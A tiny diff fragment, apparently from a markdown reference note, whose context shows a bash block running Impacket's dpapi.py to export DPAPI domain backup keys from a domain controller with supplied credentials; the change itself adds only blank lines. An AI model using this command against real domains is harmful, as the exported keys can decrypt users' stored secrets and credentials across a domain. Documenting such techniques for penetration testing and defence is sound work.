@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:13.644563+00:00'
 ```bash
 dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
 ```
+
+
